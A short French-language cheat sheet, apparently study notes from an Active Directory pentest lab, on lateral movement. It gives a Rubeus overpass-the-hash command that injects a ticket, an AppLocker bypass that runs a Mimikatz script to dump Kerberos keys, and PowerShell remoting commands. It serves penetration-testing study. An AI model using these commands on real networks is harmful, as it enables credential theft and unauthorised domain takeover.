# Cheatsheet - Lateral movement

> [!summary] Objectif
> Passer d'une machine à une autre en rejouant des creds sans mot de passe clair, ou en atteignant un hôte où une session privilégiée traîne déjà.

### Basic remote access
```powershell
Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\<USER>
winrs -r:<TARGET> cmd
```

### OverPass-the-Hash (rejouer un hash/clé AES en TGT)
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Le process spawné hérite du TGT : toute commande lancée dedans (`winrs`, `xcopy`) s'exécute avec les privilèges de `svcadmin`, sans jamais connaître son mot de passe.

### Bypass AppLocker avec Invoke-MimiEx
Quand `Loader.exe` est bloqué par AppLocker sur la cible mais que le dot-sourcing `.ps1` reste autorisé : copier `Invoke-Mimi.ps1`, y coller l'appel de fonction directement dans le script (`Invoke-Mimi -Command '"sekurlsa::ekeys"'`), le transférer et l'exécuter par dot-source sur l'hôte cible plutôt que de lancer un binaire.

> [!note] Si les identifiants sont déjà présents dans la session, éviter d'en ajouter en clair sur la ligne de commande.

**Link** — [[Cheatsheet - Privilege escalation]] · [[Cheatsheet - Post-exploitation]] · [[Cheatsheet - Tickets Kerberos]] · [[What is PowerShell]]
